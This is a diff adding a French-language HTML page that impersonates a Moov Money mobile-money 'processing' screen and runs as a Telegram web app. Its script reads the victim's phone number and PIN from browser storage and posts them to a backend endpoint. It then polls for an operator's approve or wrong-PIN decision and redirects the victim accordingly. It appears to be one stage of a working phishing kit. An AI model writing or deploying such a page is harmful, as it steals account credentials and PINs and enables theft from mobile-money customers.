@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money - Traitement</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root { --moov-orange: #f26522; --moov-blue: #004b87; }
+        body { background-color: #222; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; font-family: sans-serif; }
+        .loading-card { background: white; color: #333; width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; }
+        .loader-circle { width: 82px; height: 82px; border: 4px solid #ddd; border-top: 4px solid var(--moov-orange); border-radius: 50%; animation: spin 1.2s linear infinite; margin: 0 auto 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text" style="color:var(--moov-blue);">Traitement...</h2>
+    <p id="sub-text" style="color:#666; font-size:14px;">Vérification de vos identifiants...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "BJ" })
+        });
+    } catch (err) { console.error(err); }
+
+    setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+            
+            if (data.status === "approved") {
+                window.location.href = "/page8";
+            } else if (data.status === "denied" || data.status === "wrong_pin") {
+                window.location.href = "/page6?error=wrongpin";
+            }
+        } catch (e) {}
+    }, 2000);
+});
+</script>
+</body>
+</html>
